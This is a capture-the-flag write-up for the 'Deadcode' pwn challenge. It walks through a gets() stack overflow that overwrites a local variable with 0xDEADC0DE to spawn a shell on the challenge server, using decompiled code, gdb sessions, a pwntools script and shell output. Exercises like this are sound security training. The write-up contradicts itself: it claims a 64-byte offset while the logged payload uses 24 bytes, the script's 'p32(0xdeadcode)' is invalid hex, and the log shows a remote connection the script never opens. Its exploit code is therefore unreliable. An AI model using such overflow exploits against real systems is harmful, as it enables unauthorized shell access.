# Deadcode

## Description
I'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.

Author: xXl33t_h@x0rXx

`nc pwn-2021.duc.tf 31916`

## Analysis

IDA output:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[24]; // [rsp+0h] [rbp-20h] BYREF
  __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = 0LL;
  buffer_init(argc, argv, envp);
  puts("\nI'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.");
  puts("\nWhat features would you like to see in my app?");
  gets(v4);
  if ( v5 == 3735929054LL )
  {
    puts("\n\nMaybe this code isn't so dead...");
    system("/bin/sh");
  }
  return 0;
}
```

We immediately see the unsafe function `gets` that we can use to write past buffer size.

We also see a local variable that is initially assigned 0 and after `gets`
it is checked whether it is equal to 3735929054 (or 0xDEADC0DE).

We open it in gdb-peda and set a breakpoint before `gets`:
```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000401195 <+0>:     push   rbp
   0x0000000000401196 <+1>:     mov    rbp,rsp
   0x0000000000401199 <+4>:     sub    rsp,0x20
   0x000000000040119d <+8>:     mov    QWORD PTR [rbp-0x8],0x0
   0x00000000004011a5 <+16>:    mov    eax,0x0
   0x00000000004011aa <+21>:    call   0x401152 <buffer_init>
   0x00000000004011af <+26>:    lea    rdi,[rip+0xe52]        # 0x402008
   0x00000000004011b6 <+33>:    call   0x401030 <puts@plt>
   0x00000000004011bb <+38>:    lea    rdi,[rip+0xeb6]        # 0x402078
   0x00000000004011c2 <+45>:    call   0x401030 <puts@plt>
   0x00000000004011c7 <+50>:    lea    rax,[rbp-0x20]
   0x00000000004011cb <+54>:    mov    rdi,rax
   0x00000000004011ce <+57>:    mov    eax,0x0
   0x00000000004011d3 <+62>:    call   0x401060 <gets@plt>
   0x00000000004011d8 <+67>:    mov    eax,0xdeadc0de
   0x00000000004011dd <+72>:    cmp    QWORD PTR [rbp-0x8],rax
   0x00000000004011e1 <+76>:    jne    0x401200 <main+107>
   0x00000000004011e3 <+78>:    lea    rdi,[rip+0xebe]        # 0x4020a8
   0x00000000004011ea <+85>:    call   0x401030 <puts@plt>
   0x00000000004011ef <+90>:    lea    rdi,[rip+0xed5]        # 0x4020cb
   0x00000000004011f6 <+97>:    mov    eax,0x0
   0x00000000004011fb <+102>:   call   0x401050 <system@plt>
   0x0000000000401200 <+107>:   mov    eax,0x0
   0x0000000000401205 <+112>:   leave  
   0x0000000000401206 <+113>:   ret    
End of assembler dump.
gdb-peda$ break *(main+62)
Breakpoint 1 at 0x4011d3
gdb-peda$ r
Starting program: /home/kali/Downloads/deadcode 

I'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.

What features would you like to see in my app?
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7eddf33 (<__GI___libc_write+19>:    cmp    rax,0xfffffffffffff000)
RDX: 0x0 
RSI: 0x7ffff7fae723 --> 0xfb0670000000000a 
RDI: 0x7fffffffdf40 --> 0x401210 (<__libc_csu_init>:    push   r15)
RBP: 0x7fffffffdf60 --> 0x401210 (<__libc_csu_init>:    push   r15)
RSP: 0x7fffffffdf40 --> 0x401210 (<__libc_csu_init>:    push   r15)
RIP: 0x4011d3 (<main+62>:       call   0x401060 <gets@plt>)
R8 : 0x30 ('0')
R9 : 0x7ffff7fe21b0 (<_dl_fini>:        push   rbp)
R10: 0x7ffff7fef300 (<strcmp+4464>:     pxor   xmm0,xmm0)
R11: 0x246 
R12: 0x401070 (<_start>:        xor    ebp,ebp)
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011c7 <main+50>:  lea    rax,[rbp-0x20]
   0x4011cb <main+54>:  mov    rdi,rax
   0x4011ce <main+57>:  mov    eax,0x0
=> 0x4011d3 <main+62>:  call   0x401060 <gets@plt>
   0x4011d8 <main+67>:  mov    eax,0xdeadc0de
   0x4011dd <main+72>:  cmp    QWORD PTR [rbp-0x8],rax
   0x4011e1 <main+76>:  jne    0x401200 <main+107>
   0x4011e3 <main+78>:  lea    rdi,[rip+0xebe]        # 0x4020a8
Guessed arguments:
arg[0]: 0x7fffffffdf40 --> 0x401210 (<__libc_csu_init>: push   r15)
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf40 --> 0x401210 (<__libc_csu_init>:   push   r15)
0008| 0x7fffffffdf48 --> 0x401070 (<_start>:    xor    ebp,ebp)
0016| 0x7fffffffdf50 --> 0x7fffffffe050 --> 0x1 
0024| 0x7fffffffdf58 --> 0x0 
0032| 0x7fffffffdf60 --> 0x401210 (<__libc_csu_init>:   push   r15)
0040| 0x7fffffffdf68 --> 0x7ffff7e15d0a (<__libc_start_main+234>:       mov    edi,eax)
0048| 0x7fffffffdf70 --> 0x7fffffffe058 --> 0x7fffffffe391 ("/home/kali/Downloads/deadcode")
0056| 0x7fffffffdf78 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00000000004011d3 in main ()
gdb-peda$ 
```

As we look at the stack we identify the variable at RSP+24

We create a pattern to identify the offset:
```
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ c
Continuing.
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7fad980 --> 0xfbad208b 
RDX: 0x0 
RSI: 0x7ffff7fada03 --> 0xfb0680000000000a 
RDI: 0x7ffff7fb0680 --> 0x0 
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffdf68 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RIP: 0x401206 (<main+113>:      ret)
R8 : 0x7fffffffdf40 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
R9 : 0x0 
R10: 0x7ffff7fef300 (<strcmp+4464>:     pxor   xmm0,xmm0)
R11: 0x246 
R12: 0x401070 (<_start>:        xor    ebp,ebp)
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011fb <main+102>: call   0x401050 <system@plt>
   0x401200 <main+107>: mov    eax,0x0
   0x401205 <main+112>: leave  
=> 0x401206 <main+113>: ret    
   0x401207:    nop    WORD PTR [rax+rax*1+0x0]
   0x401210 <__libc_csu_init>:  push   r15
   0x401212 <__libc_csu_init+2>:        lea    r15,[rip+0x2bf7]        # 0x403e10
   0x401219 <__libc_csu_init+9>:        push   r14
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf68 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0x7fffffffdf70 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0x7fffffffdf78 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0x7fffffffdf80 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0032| 0x7fffffffdf88 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0040| 0x7fffffffdf90 ("AJAAfAA5AAKAAgAA6AAL")
0048| 0x7fffffffdf98 ("AAKAAgAA6AAL")
0056| 0x7fffffffdfa0 --> 0x4c414136 ('6AAL')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000401206 in main ()
gdb-peda$ 
```

As we can see at RSP+24 it begins with `AAdAA3AA` so let's try to find the offset:

```
gdb-peda$ pattern offset AAdAA3AA
AAdAA3AA found at offset: 64
```

This means we need 64 bytes of junk then we control the variable. Let's create a python script for that:

```python
from pwn import *

context.log_level = 'debug'

r = process("./deadcode")
r.recvuntil("app?")
r.sendline(b'A' * 64 + p32(0xdeadcode))
r.interactive()
```

We run the script:

```
[+] Opening connection to pwn-2021.duc.tf on port 31916: Done
[+] Starting local process './deadcode' argv=[b'./deadcode'] : pid 1846
/home/kali/Downloads/exp.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("app?")
[DEBUG] Received 0x9f bytes:
    b'\n'
    b"I'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.\n"
    b'\n'
    b'What features would you like to see in my app?\n'
[DEBUG] Sent 0x1d bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  de c0 ad de  0a           │AAAA│AAAA│····│·│
    0000001d
[*] Switching to interactive mode

[DEBUG] Received 0x23 bytes:
    b'\n'
    b'\n'
    b"Maybe this code isn't so dead...\n"


Maybe this code isn't so dead...
$ whoami
[DEBUG] Sent 0x7 bytes:
    b'whoami\n'
[DEBUG] Received 0x5 bytes:
    b'kali\n'
kali
$  
```

We got a shell! We replace `process("./deadcode")` with `remote("pwn-2021.duc.tf", 31916)`:
```
Maybe this code isn't so dead...
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0xd bytes:
    b'flag.txt\n'
    b'pwn\n'
flag.txt
pwn
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x2b bytes:
    b'DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}'
DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}$  
```